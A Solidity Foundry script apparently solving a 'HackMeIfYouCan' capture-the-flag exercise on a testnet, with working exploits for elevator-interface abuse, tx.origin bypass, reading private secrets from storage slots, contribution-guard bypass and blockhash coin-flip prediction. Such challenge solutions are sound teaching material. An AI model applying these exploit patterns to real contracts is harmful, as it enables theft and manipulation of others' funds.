// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan, Building} from "../src/HackMeIfYouCan.sol";

contract Attacker is Building {
    // Elevator like (toggle to control the stat of the last floor)
    bool toggle = true;

    // 
    HackMeIfYouCan public enemy;

    constructor (HackMeIfYouCan _enemy ){
        enemy = _enemy;
    }

    // Elevator like (given interface, don't care about the _floor)
    function isLastFloor(uint256) external override returns (bool){
        toggle = !toggle;
        return toggle;
    }

    // 
    function attackElevator() public returns (bool){
        enemy.goTo(1);
        return enemy.top(tx.origin);
    }
    //

    // Just call as intermediary (due to msg.sender != tx.origin)
    function attackAddPoint() public {
        enemy.addPoint();
    }
    //

}
//

contract HackMeIfYouCanScript is Script {
    Attacker attacker;

    HackMeIfYouCan hackMeIfYouCan;

    function GetChainId() public view returns (uint256){
        uint id;
        assembly{
            id := chainid()
        }
        return id;
    }

    function setUp() public {}

    function run() public {
        // Start to broadcast transactions
        vm.startBroadcast();
        
        // Select the behavior depending on the chain
        if (GetChainId() == 43113){
            console.log("FUJI C-Chain");
            hackMeIfYouCan = HackMeIfYouCan(0xAf32e1287cc1d80635E6Fd39E969E79F5d519e16);
        } else{
            console.log("Local");
            bytes32[15] memory test;
            hackMeIfYouCan = new HackMeIfYouCan(bytes32(uint256(123)), test);
        }

        // Instantiate the intermediate contract (to play with msg.sender)
        attacker = new Attacker(hackMeIfYouCan);

        // Get free point
        attacker.attackAddPoint();

        // 
        console.log("Is Last Floor: ", attacker.attackElevator());

        // data if slot 4 and and then key 12 is slot 12 + 4
        hackMeIfYouCan.sendKey(bytes16(vm.load(address(hackMeIfYouCan), bytes32(uint256(16)))));

        // password is slot 3
        hackMeIfYouCan.sendPassword(vm.load(address(hackMeIfYouCan), bytes32(uint256(3))));

        // Contribute at 1 wei to pass the guard and have the contribution
        hackMeIfYouCan.contribute{value: 1}();

        // send the 1 wei to call receive as I have a contribution 
        payable(hackMeIfYouCan).call{value: 1}("");
        //

        // 
        console.log( hackMeIfYouCan.balanceOf(msg.sender));
        console.log(hackMeIfYouCan.transfer(address(0), 1));

        console.log("My points: ", hackMeIfYouCan.marks(msg.sender));

        vm.stopBroadcast();
    }
}
// Coin flip
contract SyncBlock {
    uint256 FACTOR =
        6275657625726723324896521676682367236752985978263786257989175917;
    function tricheur(address payable hackMeIfYouCan) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipVal = blockValue / FACTOR;
        bool side = coinFlipVal == 1 ? true : false;
        return HackMeIfYouCan(hackMeIfYouCan).flip(side);
    }
}

contract CoinFlipSolution is Script {
    SyncBlock public syncBlock;
    HackMeIfYouCan hackMeIfYouCan;

    function GetChainId() public view returns (uint256){
        uint id;
        assembly{
            id := chainid()
        }
        return id;
    }

    function run() external {
        vm.startBroadcast(); 
        if (GetChainId() == 43113){
            console.log("FUJI C-Chain");
            hackMeIfYouCan = HackMeIfYouCan(0xAf32e1287cc1d80635E6Fd39E969E79F5d519e16);
        } else{
            console.log("Local");
            bytes32[15] memory test;
            hackMeIfYouCan = new HackMeIfYouCan(bytes32(uint256(123)), test);
        }

        // If not deployed, deploy it
        // syncBlock = new SyncBlock();
        // Else, use the deployed one
        syncBlock = SyncBlock(0x51120f019C5322c78Eabfcb1e751f9788dCa5B65);
        console.log("Solving CoinFlip...");

        // for (uint8 i = 0; i<10; i++){
        console.log("CoinFlip predict: ", syncBlock.tricheur(payable(hackMeIfYouCan)));
        //     while (lastBlock == block.number){vm.sleep(3_000);lastBlock = block.number;}
        // }

        console.log("My wins: ", hackMeIfYouCan.getConsecutiveWins(msg.sender));
        console.log("My points: ", hackMeIfYouCan.marks(msg.sender));
        vm.stopBroadcast();
        console.log("CoinFlip Solved!");
    }
}
